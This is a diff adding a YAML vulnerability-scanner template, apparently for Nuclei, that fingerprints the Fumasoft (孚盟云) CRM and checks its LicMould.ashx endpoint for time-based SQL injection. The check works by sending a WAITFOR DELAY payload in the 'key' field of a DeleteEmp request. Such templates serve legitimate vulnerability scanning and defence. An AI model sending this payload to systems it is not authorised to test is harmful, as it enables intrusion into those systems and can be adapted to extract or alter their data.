@@ -1,0 +1,46 @@
+id: poc-yaml-fumasoft-licmould-ashx-sqli
+info:
+  name: Fumasoft LicMould.ashx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in the Fumasoft LicMould.ashx endpoint, exploitable via timing-based injection.
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "孚盟云"
+        part: body
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/Ajax/LicMould.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "action=DeleteEmp&key=-99+WAITFOR+DELAY+'0:0:{{t1}}'--&fuids=abc"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "ok"
+        part: body
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
